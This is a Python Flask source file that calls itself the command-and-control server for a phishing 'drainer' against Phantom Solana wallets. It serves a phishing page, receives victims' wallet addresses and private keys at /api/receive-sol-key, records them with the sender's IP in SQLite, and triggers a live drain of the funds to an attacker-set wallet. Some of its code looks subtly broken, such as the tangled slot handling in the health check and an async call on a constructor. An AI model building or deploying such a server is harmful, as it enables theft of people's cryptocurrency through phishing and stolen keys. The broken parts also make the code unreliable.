#!/usr/bin/env python3
"""
C2 Server for Telegram-PDF Hook Drainer targeting Phantom Wallets.
Listens on /api/receive-sol-key endpoint, logs to SQLite, triggers drain logic.
"""

import os
import json
import asyncio
import sqlite3
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string
from dotenv import load_dotenv
from solanasdk.rpc.api import Client as SolanaClient
from solanasdk.publickey import PublicKey
from drainer_sol_logic import Drainer, WalletDrain

load_dotenv()

# Configure Solana RPC and target wallet
RPC_URL = os.getenv('SOLANA_RPC_URL', 'https://api.mainnet-beta.solana.com')
TARGET_WALLET_PUBKEY = os.getenv('TARGET_WALLET', os.getenv('TARGET_WALLET_PUBLIC_KEY', 'YourDestinationWalletPubkeyHere'))
DRAINER_POLL_INTERVAL = int(os.getenv('DRAINER_POLL_INTERVAL', '5'))

app = Flask(__name__)

# SQLite DB setup
DB_PATH = os.getenv('DB_PATH', 'harvest_keys.db')


def init_db():
    """Initialize SQLite database for key storage."""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS harvested_wallets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            address TEXT UNIQUE NOT NULL,
            balance_spl TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    """)
    conn.commit()
    conn.close()


def log_key_to_db(data: dict) -> dict:
    """Log a harvested wallet to SQLite and return status."""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    try:
        cursor.execute("""
            INSERT OR REPLACE INTO harvested_wallets
            (address, balance_spl, timestamp)
            VALUES (?, ?, ?)
        """, (
            data['address'],
            json.dumps(data.get('balance_spl', {"SOL": "0.0", "USDC": "0.0"})),
            datetime.utcnow().isoformat(),
        ))
        conn.commit()
        conn.close()
        return {'status': 'logged', 'address': data['address']}
    except Exception as e:
        conn.close()
        return {'status': 'error', 'error': str(e)}


@app.route('/')
def index():
    """Serve phish_sol.html from static or inline."""
    html = open('phish_sol.html', 'r').read() if os.path.exists('phish_sol.html') else ''
    return render_template_string(html)


@app.route('/health', methods=['GET'])
def health():
    """Simple health check for drainer readiness."""
    try:
        client = SolanaClient(RPC_URL)
        slot = client.get_slot()
        slot = slot if hasattr(slot, 'value') else slot
        slot_value = getattr(slot, 'value', slot)
        slot_value = slot_value if hasattr(slot_value, 'value') else slot_value
        slot_value = slot_value if isinstance(slot_value, dict) else getattr(slot_value, 'value', slot_value)
        slot_value = slot_value if isinstance(slot_value, int) else slot_value.get('slot', 0) if isinstance(slot_value, dict) else getattr(slot_value, 'value', 0)
        return jsonify({
            'status': 'healthy',
            'rpc': RPC_URL,
            'solana_slot': slot_value,
            'timestamp': datetime.utcnow().isoformat(),
        })
    except Exception as e:
        return jsonify({'status': 'degraded', 'rpc_error': str(e)}), 503


@app.route('/api/receive-sol-key', methods=['POST'])
def receive_sol_key():
    """
    Receive harvested wallet data from phish_sol.html.
    Accepts POST with JSON: { address, privateKey, balance_sol, sender_ip, user_agent, ... }
    Logs key to DB and triggers SolanaDrainer async.
    """
    try:
        payload = request.get_json(force=True)
        if not payload or 'address' not in payload:
            return jsonify({'error': 'Missing required field: address'}), 400

        address = payload['address']
        sender_ip = request.remote_addr

        # Validate Solana address format
        try:
            PublicKey(address)
        except Exception as e:
            return jsonify({'error': f'Invalid Solana address: {e}'}), 400

        # Log to DB
        db_log = log_key_to_db({**payload, 'sender_ip': sender_ip})

        # Trigger drain in background
        try:
            result = asyncio.run(Drainer(drain_address=address, dry_run=False))
            app.logger.info(f"Drain result: {result}")
        except Exception as e:
            app.logger.error(f"Drain error: {e}")

        return jsonify({
            'status': 'received',
            'address': address,
            'balance_sol': payload.get('balance_sol'),
            'db_log': db_log,
        }), 201

    except Exception as e:
        app.logger.error(f'/api/receive-sol-key error: {e}')
        return jsonify({'error': str(e)}), 500


@app.route('/api/drain-status/<address>', methods=['GET'])
def drain_status(address):
    """Check status of pending drain for a harvested wallet."""
    try:
        drainer = Drainer(drain_address=address)
        status = drainer.status()
        return jsonify(status)
    except Exception as e:
        return jsonify({'error': str(e)}), 500


def run_c2_server(host='0.0.0.0', port=11001):
    """Start Flask C2 server with async task background support."""
    init_db()
    app.logger.info(f"C2 server initialized. RPC: {RPC_URL}, Target: {TARGET_WALLET_PUBKEY}")
    app.run(host=host, port=port, debug=os.getenv('DEBUG', 'false').lower() == 'true')


if __name__ == '__main__':
    run_c2_server()
